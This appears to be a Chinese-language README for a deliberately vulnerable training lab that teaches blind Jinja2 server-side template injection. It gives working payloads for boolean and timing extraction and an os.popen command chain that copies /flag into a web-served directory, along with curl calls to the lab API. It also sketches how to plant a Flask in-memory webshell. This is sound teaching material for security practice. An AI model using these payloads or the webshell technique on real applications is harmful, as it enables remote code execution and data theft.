# 06 · 无回显 SSTI：盲注与侧信道

| | |
|---|---|
| 端口 | `8096`（`BLIND_SSTI_PORT` 可改） |
| 引擎 | Jinja2（Flask `render_template_string`，**无沙箱**） |
| 关卡数 | 4（id `0`–`3`） |
| 依赖网络 | 否（L4 的题目语义是「不出网」；本容器本身**没有**做网络隔离） |
| flag | 容器内 `/flag`（entrypoint 写入）；L1/L2 另外注入模板变量 `secret`（教学装置） |
| 回显目录 | `ECHO_DIR`，默认 `/app/echo`，由 `app.py` 创建并 `chmod 0777`，经 `GET /echo/<path>` 暴露 |

## 这个靶场在教什么

**没有回显的时候，你还有什么？** 本靶场把「回显」这一个维度关到四个不同的档位，
逼你把「读取数据」翻译成别的信道：

1. **布尔信道**（L1）：只有 `correct` / `wrong`。数据 → 条件 → 异常与否。
2. **时间信道**（L2）：连成败都不告诉你，响应体恒定。数据 → 条件 → 耗时。
3. **副作用信道**（L3）：没有回显也没有上下文变量，flag 只在 `/flag`。
   数据 → 写进 HTTP 可访问目录 → 用 HTTP 取回。
4. **不出网**（L4）：反弹 shell / DNSLog / 外连下载全部失效，
   而回显与文件这两条信道在真实场景里随时可能被掐掉——
   那时剩下的唯一答案是**内存马**（把能力留在入站 HTTP 通道上），
   见 `07-flask-memshell`。

L1/L2 的 `secret` 是**教学装置**：真实盲注里你并不知道数据在哪，
得先用 SSTI 探测（读文件、取对象），再用本靶场这两关教的信道把结果一位一位取出来。
L3/L4 就不再给 `secret`，必须自己完成「命令执行 + 带外」。

## 关卡表

| id | 关卡 | 回显方式 | 信道 | 关键 payload 形态 |
|----|------|----------|------|-------------------|
| 0 | L1 布尔盲注 | `correct` / `wrong` | 异常与否 | `{% if secret[0] == 'f' %}{{ 1/0 }}{% endif %}` |
| 1 | L2 时间盲注 | 常量 `received` | 响应耗时 | `{% if <条件> %}{% for i in range(50000000) %}{{ '' }}{% endfor %}{% endif %}` |
| 2 | L3 写文件回显 | 常量 `ok` | 文件 → HTTP | `{{ lipsum.__globals__['os'].popen('cat /flag > /app/echo/f.txt').read() }}` + `GET /echo/f.txt` |
| 3 | L4 不出网 | 常量 `ok` | 文件 → HTTP（本容器内仍可写） | 同 L3；语义上要意识到「该做内存马了」 |

## 参考解

下面所有 payload 都由 `tests/verify_blind.py` 在**容器内**实跑并断言
（L1 的 flag 是逐字符盲注还原出来的，不是读文件读出来的）。

### L1（id 0）布尔盲注 ✅

```jinja2
{{ secret }}                                             → correct（拿不到内容，盲关只回 correct/wrong）
{% if secret[0] == 'f' %}{{ 1/0 }}{% endif %}            → wrong   （猜中）
{% if secret[0] == 'Z' %}{{ 1/0 }}{% endif %}            → correct （猜错）
```

线性枚举 95 个可打印字符太慢，用比较做**二分**，每字符约 7 次请求：

```jinja2
{% if secret[0] <= 'm' %}{{ 1/0 }}{% endif %}
```

`wrong` 表示「小于等于猜想值」，`correct` 表示「大于」。按这个规则在
`' '`(32) ~ `'~'`(126) 上二分，逐字符拼回 `secret` 即可。
`tests/verify_blind.py` 就是用这条逻辑把整条 flag 还原出来并与 `/flag` 比对的。

### L2（id 1）时间盲注 ✅

响应体永远是 `received`，所以只能看耗时：

```jinja2
{% if secret[0] == 'f' %}{% for i in range(50000000) %}{{ '' }}{% endfor %}{% endif %}
```

**实测耗时表**（在本镜像里经 `POST /api/render` 端到端测得；
`tests/verify_blind.py` 取 3 次中位数，并断言「命中 - 基线 > 0.5 s」）：

| payload | 实测 |
|---------|------|
| `{% for i in range(1) %}{{ '' }}{% endfor %}`（近似基线） | ≈ 14 ms |
| `range(20000000)` + 空循环体 | ≈ 240 ms |
| `range(20000000)` + `{{ '' }}` | ≈ 600 ms |
| `range(50000000)` + `{{ '' }}` | ≈ 1.44 s |
| `range(100000000)` + `{{ '' }}` | ≈ 5.9 s |

⚠️ 绝对耗时**强依赖宿主 CPU 与容器负载**（同一台机器上不同循环规模甚至不成线性），
所以别把秒数写死在脚本里——要拿它和**自己测出来的基线**比。

**真实的测量注意点**（别把噪声当信号）：

1. **先取基线**：同一个 payload 把条件换成恒假（例如 `secret[0] == 'Z'`），
   跑 3~5 次记中位数。容器冷启动、首次请求、宿主负载都会让绝对值飘。
2. **看相对差，不看绝对秒数**：只有当「命中 - 基线」显著大于抖动
   （本靶场实测 ≈ 1.3 s，抖动通常 < 0.05 s）才判定为真。
3. **别用空循环体**：`range(20000000)` 空体只要 ≈ 0.24 s，很容易被噪声吞掉；
   换成 `range(50000000)` + `{{ '' }}` 循环体就能把耗时抬到 ≈ 1.44 s。
4. **多次取中位数**，避免单次抖动误判；判定门槛别卡太死（0.5 s 左右比较稳）。

### L3（id 2）写文件回显 ✅

上下文里没有 `secret`，flag 只在 `/flag`；渲染结果只回一个常量 `ok`。
容器把 `/app/echo` 暴露成 `GET /echo/<path>`，于是：

```jinja2
{{ lipsum.__globals__['os'].popen('cat /flag > /app/echo/f.txt').read() }}
```

然后：

```bash
curl -s localhost:8096/echo/f.txt      # → flag{...}
```

`lipsum`、`cycler`、`joiner`、`namespace` 都是 Jinja 默认全局，
`lipsum.__globals__['os']` 与 `cycler.__init__.__globals__['os']` 都能直达 `os` 模块
（两条链 `tests/verify_blind.py` 分别用在 L3 / L4 上跑过）。
注意 `popen(...)` 的返回值不要直接渲染到响应里——那一关是「无回显」，
结果只应该经由文件信道取回。

### L4（id 3）不出网：为什么最终答案是内存马 ✅

关卡带 `no_egress=True`（控制台会给它打「不出网」标记），机制与 L3 相同：

```jinja2
{{ cycler.__init__.__globals__['os'].popen('cat /flag > /app/echo/f.txt').read() }}
```

```bash
curl -s localhost:8096/echo/f.txt      # → flag{...}
```

**本关是桥梁，不是终点**：本容器里回显目录是可写的（否则这一关在靶场内无解），
所以你能用 L3 的办法完成它。要体会这一关真正想说的东西，请把
「回显目录也不可写」叠加进来：

| 场景 | 可用信道 |
|------|----------|
| 有回显 | 直接读 |
| 无回显、能写文件 | 文件 → HTTP（L3/L4 用的） |
| 无回显、不能写文件、**能出网** | 反弹 shell / DNSLog |
| 无回显、不能写文件、**不能出网** | 只剩把能力注入**已经存在的入站 HTTP 通道** → 内存马 |

最后一行就是 `07-flask-memshell`：往运行中的 Flask 进程注入一条路由，或一个
`before_request` 钩子，得到可反复调用、不落文件的内存 webshell。
（提示：Flask 的 `setupmethod` 会在应用处理过第一个请求后让
`add_url_rule` / `before_request` 直接抛 `AssertionError`，
所以真正的内存马要绕过公开 API 去改 `url_map` / `view_functions` /
`before_request_funcs` 这些底层结构。）

## 运行

```bash
# 1) 先构建统一前端镜像（只需一次）
scripts/build-frontend.sh            # Windows: scripts\build-frontend.ps1

# 2) 起本靶场
cd labs/06-blind-ssti
docker compose up --build            # → http://127.0.0.1:8096

# 或者用仓库根目录编排一次起全部
docker compose up -d
```

## 直接调 API（不依赖前端）

```bash
curl -s localhost:8096/api/lab-info | jq '.levels[] | {id, echo_mode, blind, no_egress}'

# L1：布尔信道
curl -s -X POST localhost:8096/api/render -H 'Content-Type: application/json' \
     -d '{"level":"0","template":"{% if secret[0] == \"f\" %}{{ 1/0 }}{% endif %}"}' | jq -r .output
# → wrong

# L2：时间信道（自己掐表）
time curl -s -X POST localhost:8096/api/render -H 'Content-Type: application/json' \
     -d '{"level":"1","template":"{% if secret[0] == \"f\" %}{% for i in range(50000000) %}{{ \"\" }}{% endfor %}{% endif %}"}' | jq -r .output
# → received（但慢了约 1.4 s）

# L3：写文件 + 取回
curl -s -X POST localhost:8096/api/render -H 'Content-Type: application/json' \
     -d '{"level":"2","template":"{{ lipsum.__globals__[\"os\"].popen(\"cat /flag > /app/echo/f.txt\").read() }}"}' | jq -r .output
curl -s localhost:8096/echo/f.txt
```

## 上帝模式（出题人视角）

`mode=god` 会额外返回：

| 字段 | 用途 |
|------|------|
| `raw_output` | 盲关真实渲染结果 —— L1/L2 里就是 `secret` 的内容，盲判写错时用它定位 |
| `template_after_waf` | 本靶场无 WAF，回显原样模板 |
| `error` / `exception_type` | 布尔盲注的「信号源」：`ZeroDivisionError` = 条件成立 |
| `source_class` | 关卡工厂名（`L01`…`L04`，定义在 `labs/06-blind-ssti/app.py`） |

出题人小技巧：构造盲注 payload 时先开上帝模式确认 `raw_output`，
再去练习模式里做盲判——**先确保载荷本身是对的，再考验信道**。
